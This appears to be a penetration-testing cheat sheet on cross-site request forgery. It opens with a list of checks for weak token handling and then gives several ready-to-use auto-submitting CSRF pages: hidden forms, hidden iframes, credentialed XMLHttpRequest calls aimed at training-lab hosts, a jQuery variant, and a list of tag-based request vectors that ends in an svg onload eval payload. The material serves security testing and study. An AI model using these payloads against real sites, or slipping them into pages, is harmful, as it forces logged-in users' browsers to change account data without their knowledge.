# Cross Site Request Forgery (CSRF)

**Pre-checks**

* **CSRF - missing headers**
  * Generate basic Burp CSRF payload and open in same session as application.
* **CSRF Token is not tied to any session**&#x20;
  * Generate basic Burp CSRF payload and open in different user session.
* **Same site request forgery**
  * If site allows uploading html, try uploading Burp CSRF PoC and see if we can trigger post/put
* **Obfuscate/Modify**
  * Change PoC to resemble image/other tags. Verify
* **Remove CSRF token**
  * Remove the CSRF token if any and send the request. Verify if there is no validation for missing CSRF token
* **Send CSRF token of different user**
  * Send value of CSRF token of a different user and
* **Send key but no value**
  * Send the CSRF token without any key
* **Check if any action is done using GET**
  * Verify if any action that updates/deletes/adds entries in database are using GET

**Burpsuite PoC**

```html
<html>
    <body>
        <script>history.pushState('', '', '/')</script>
        <form action="https://ac6e1f341f480c87c0b61b7900540040.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="test1@gmail.com" />
            <input type="submit" value="Submit request" />
        </form>
        <script> document.forms[0].submit(); </script>
    </body>
</html>
```

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>
```

```html
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/ac381f7a1eae7d9ec02109d600bf0003.web-security-academy.net\/my-account\/change-email", true);
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
        xhr.withCredentials = true;
        var body = "email=test1%40gmail.com&csrf=WXaUOFCI2lTAe9luXLDLyiujxNLsZXhZ";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```

```html
<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>
```

**Other PoCs**

```html
<img src="http://google.es?param=VALUE" style="display:none" />
<iframe src="http://google.es?param=VALUE" />
<script src="http://google.es?param=VALUE" />
<input type='image' alt='' src="http://google.es?param=VALUE" />
<embed src="http://google.es?param=VALUE" />
<audio src="http://google.es?param=VALUE" />
<video src="http://google.es?param=VALUE" />
<source src="http://google.es?param=VALUE" />
<video poster="http://google.es?param=VALUE" />
<link rel="stylesheet" href="http://google.es?param=VALUE" />
<object data="http://google.es?param=VALUE" />
<body background="http://google.es?param=VALUE" />
<div style="background:url(http://google.es?param=VALUE)" />
<style>body{background:url(http://google.es?param=VALUE) } </style>
<svg/onload=eval(atob('<base 64 payload>'));//>

```

